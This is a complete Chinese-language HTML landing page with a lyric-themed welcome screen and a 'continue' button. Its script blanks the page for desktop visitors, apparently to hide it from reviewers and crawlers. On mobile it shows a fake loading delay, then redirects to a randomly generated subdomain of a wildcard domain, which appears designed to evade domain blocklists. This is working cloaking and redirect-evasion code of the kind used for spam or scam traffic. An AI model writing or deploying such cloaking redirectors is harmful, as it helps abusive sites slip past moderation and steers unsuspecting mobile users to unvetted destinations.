<!doctype html>
<html lang="zh">
<head>
  <meta charset="utf-8">

  <meta name="renderer" content="webkit">
  <meta name="layoutmode" content="standard">

  <meta property="og:type" content="website">

  <meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/340682/9/21271/28722/68f1f89fF2d8a8acb/d8c5b19e757b3d27.jpg">
  <link rel="shortcut icon" href="https://img10.360buyimg.com/ddimg/jfs/t1/340682/9/21271/28722/68f1f89fF2d8a8acb/d8c5b19e757b3d27.jpg" type="image/x-icon">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        
        /* 核心修改：欢迎屏幕添加背景图 */
        .welcome-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            /* 背景图核心样式：替换成你的背景图URL */
            background: url("http://111.yx98.aiyd.net.cn/photos/ph.jpg") no-repeat center center / cover;
            /* 可选：叠加半透明渐变，让文字/按钮更清晰（可调整透明度） */
            background-blend-mode: overlay;
            background-color: rgba(0, 0, 0, 0.1); /* 黑色半透明叠加，数值越小越透明 */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            color: white;
        }
        
        .continue-btn {
            background: linear-gradient(135deg, #ff0050, #ff6b9d);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 30px;
            transition: all 0.3s ease;
            /* 按钮加阴影，提升辨识度 */
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }
        
        .continue-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 0, 80, 0.3);
        }
        
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 999;
            color: white;
        }
        
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #ff0050;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .fade-out {
            animation: fadeOut 0.5s ease-out forwards;
        }
        
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; visibility: hidden; }
        }
        
        .hidden {
            display: none;
        }
        
        .welcome-content {
            text-align: center;
            max-width: 300px;
            /* 内容加半透明背景，提升文字可读性 */
            background: rgba(0, 0, 0, 0.4);
            padding: 20px 30px;
            border-radius: 15px;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        p {
            font-size: 14px;
            color: #cccccc;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <!-- 欢迎屏幕 -->
    <div id="welcomeScreen" class="welcome-screen">
        <div class="welcome-content">
            <h1>天青色等烟雨</h1>
            <p>只为与你相遇</p>
            <button id="continueBtn" class="continue-btn">继续访问</button>
        </div>
    </div>

    <!-- 加载屏幕 -->
    <div id="loadingScreen" class="loading-screen hidden">
        <div class="loader"></div>
        <p>正在加载中，请稍候...</p>
    </div>

    <script>
        // 设备检测函数
        function isMobileDevice() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // 生成随机前缀（6位随机字符，包含字母和数字）
        function generateRandomPrefix(length = 6) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let prefix = '';
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * chars.length);
                prefix += chars[randomIndex];
            }
            return prefix;
        }

        // 页面加载完成后执行
        document.addEventListener('DOMContentLoaded', function() {
            const welcomeScreen = document.getElementById('welcomeScreen');
            const loadingScreen = document.getElementById('loadingScreen');
            const continueBtn = document.getElementById('continueBtn');

            // 检查是否为移动设备
            if (!isMobileDevice()) {
                // 非移动设备，显示空白页面
                document.body.innerHTML = '<div style="width:100%;height:100%;background:#000;"></div>';
                return;
            }

            // 继续访问按钮点击事件
            continueBtn.addEventListener('click', function() {
                // 显示加载动画
                welcomeScreen.classList.add('fade-out');
                
                setTimeout(() => {
                    welcomeScreen.classList.add('hidden');
                    loadingScreen.classList.remove('hidden');
                    
                    // 模拟加载过程
                    setTimeout(() => {
                        // 生成随机前缀并构建目标URL
                        const randomPrefix = generateRandomPrefix();
                        // 替换为你的泛解析主域名（例如：your-domain.com）
                        const mainDomain = 'rshqwjm.cn';
                        // 构建完整URL（如果有路径参数可以在这里拼接）
                        const targetUrl = `http://${randomPrefix}.${mainDomain}/a/617971?kadR`;
                        
                        // 跳转到目标URL
                        window.location.href = targetUrl;
                    }, 2000);
                }, 500);
            });
        });
    </script>
</body>
</html>
